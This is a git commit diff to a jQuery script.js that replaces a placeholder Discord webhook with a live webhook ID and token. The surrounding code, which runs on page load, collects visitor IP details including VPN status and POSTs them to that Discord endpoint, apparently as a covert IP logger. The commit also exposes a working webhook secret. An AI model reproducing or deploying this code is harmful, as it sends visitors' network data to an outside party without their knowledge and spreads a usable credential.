0cd2f4a36fac8706a89b0ef55aca5cdcdc32eed4
qimpy67 <specialist.cohesity@gmail.com>
2025-04-09 18:40:39 -0400

    Update script.js

--- script.js
+++ script.js
@@ -8,7 +8,7 @@ $(document).ready(function () {
                          + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');
 
             $.ajax({
-                url:  "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+                url:  "https://discord.com/api/webhooks/1359650679408562409/AUmAuYTrp7-uFo5h5UXMwL47Z81YUATfkeeK06IBqsnHsRsdiNJbEU6zGRPDaFRoTQXB",
                 type: 'POST',
                 data: JSON.stringify({ content: message }),
                 contentType: 'application/json'
